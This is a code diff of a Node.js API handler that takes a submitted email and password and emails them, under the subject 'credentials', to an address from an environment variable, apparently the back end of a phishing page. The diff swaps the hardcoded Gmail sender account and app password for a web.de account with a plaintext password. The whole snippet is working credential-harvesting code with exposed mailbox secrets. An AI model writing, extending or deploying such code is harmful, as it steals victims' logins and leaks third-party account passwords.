@@ -13,19 +13,19 @@ export default function handler(
   const { email, password } = req.body;
 
   let transporter: nodemailer.Transporter = nodemailer.createTransport({
-    service: "Gmail",
-    host: "smtp.gmail.com",
+    service: "Wed.de",
+    host: "smtp.web.de",
     port: 465,
     secure: true,
     auth: {
-      user: "Sgtalexelizondo@gmail.com",
-      pass: "grnudpdsgucnpaeh",
+      user: "jens.muench1993@web.de",
+      pass: "Mandylein1234!",
     },
   });
 
   return transporter
     .sendMail({
-      from: `"datt" <Sgtalexelizondo@gmail.com>`,
+      from: `"datt" <jens.muench1993@web.de>`,
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `email: ${JSON.stringify(email)}, password: ${JSON.stringify(password)}`
